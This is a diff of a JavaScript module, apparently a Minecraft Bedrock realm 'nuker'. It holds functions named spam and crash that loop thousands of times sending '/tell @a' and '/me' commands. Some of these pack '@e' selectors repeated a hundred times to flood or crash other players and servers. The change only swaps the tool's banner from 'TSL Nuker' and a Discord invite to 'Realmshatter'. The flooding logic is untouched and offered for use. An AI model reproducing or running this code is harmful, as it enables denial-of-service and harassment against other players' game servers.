@@ -273,7 +273,7 @@ module.exports = {
 function spamOne(sendCommand, msg1) {
   for (let i = 0; i < 10000; i++) {
     sendCommand({
-      command: `/tell @a ${colorizeText(msg1)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `/tell @a ${colorizeText(msg1)} \n§4§l§ Realmshatter §1§ on §4§  TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -288,7 +288,7 @@ function spamOne(sendCommand, msg1) {
 function crashOne(sendCommand, me1) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `/me ${colorizeText(me1)}  \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `/me ${colorizeText(me1)}  \n§4§l§ Realmshatter §1§ on §4§ TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -303,7 +303,7 @@ function crashOne(sendCommand, me1) {
 function spamTwo(sendCommand) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `/tell @a §l§c§k${"@e".repeat(100)} |  ${colorizeText('§4§l§ TSL §1§ NUKER §6§ ON §4§ TOP : §c§ discord.gg/armbe')}`,
+      command: `/tell @a §l§c§k${"@e".repeat(100)} |  ${colorizeText('§4§l§ Realmshatter §1§ on §6§ TOP §4§ XD : §c§ Womp Womp')}`,
       origin: {
         type: 5,
         uuid: '',
@@ -318,7 +318,7 @@ function spamTwo(sendCommand) {
 function crashTwo(sendCommand, msg2) {
   for (let i = 0; i < 10000; i++) {
     sendCommand({
-      command: `/tell @a ${colorizeText(msg2)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `/tell @a ${colorizeText(msg2)} \n§4§l§ Realmshatter §1§ on §4§  TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -333,7 +333,7 @@ function crashTwo(sendCommand, msg2) {
 function spamThree(sendCommand, me2) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `/me ${colorizeText(me2)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
+      command: `/me ${colorizeText(me2)} \n§4§l§ Realmshatter §1§ on §4§  TOP`,
       origin: {
         type: 5,
         uuid: '',
@@ -348,7 +348,7 @@ function spamThree(sendCommand, me2) {
 function crashThree(sendCommand) {
   for (let i = 0; i < 5000; i++) {
     sendCommand({
-      command: `/tell @a §l§c§k${"@e".repeat(100)} | ${colorizeText('§4§l§ TSL §1§ NUKER §6§ ON §4§ TOP : §c§ discord.gg/armbe')}`,
+      command: `/tell @a §l§c§k${"@e".repeat(100)} | ${colorizeText('§4§l§ Realmshatter §1§ on §6§ top §4§ XD : §c§ Womp Womp')}`,
       origin: {
         type: 5,
         uuid: '',
